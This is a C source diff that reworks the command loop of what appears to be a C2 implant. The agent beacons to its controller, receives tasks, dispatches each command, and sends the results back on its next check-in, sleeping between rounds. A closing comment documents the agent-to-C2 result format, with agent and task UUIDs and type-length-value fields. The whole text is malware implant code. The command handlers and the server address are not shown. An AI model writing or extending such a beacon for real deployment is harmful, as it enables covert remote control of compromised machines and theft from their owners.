@@ -25,34 +25,65 @@ int main(void){
 
     sleep(10);
 
+    PPackage prevResults = NULL;
     // command roop
     while(TRUE){
+        PPackage package = newPackage(TRUE);
 
-        PParser parser = sendAndReceive();
-        BYTE taskCount = getTaskCount(parser);
-
-
-        for(BYTE i = 0; i < taskCount; i++){
-            PCommand cmd = tlvReadField(parser);
-            PCmdResult result = dispatchCommand(cmd);
+        if(prevResults != NULL){
+        addBytes(package, prevResults->buffer, prevResults->size);
+        freePackage(prevResults);
+        prevResults = NULL;
         }
 
-        sleep(10);
+        PParser parser = sendAndReceive(package->buffer, package->size);
+        freePackage(package);
+
+        if(parser == NULL){
+        sleep(corn_config.SleepTime);
+        continue;
+        }
+
+        prevResults = newPackage(FALSE);
+
+        BYTE taskCount = getTaskCount(parser);
+        for(BYTE i = 0; i < taskCount; i++){
+        PCommand cmd = tlvReadField(parser);
+        PCmdResult result = dispatchCommand(cmd);
+
+        tlvWriteField(prevResults, result);
+
+        freePCommand(cmd);
+        freeCmdResult(result);
+        }
+        freeParser(parser);
+
+        sleep(corn_config.SleepTime);
     }
-
-
-
-
-
-
-
-
-
-
-
-
-
-
     return 0;
 }
 
+
+
+/*
+send Bytes
+
+agent -> C2
+
+Header:
+  AgentUUID (36bytes)
+
+Result[0]:
+  TaskUUID (36bytes)
+  success   (1byte)
+  type     (1byte)
+  length   (4bytes)
+  value    (n bytes)
+
+Result[1]:
+  TaskUUID (36bytes)
+  success   (1byte)
+  type     (1byte)
+  length   (4bytes)
+  value    (n bytes)
+*/
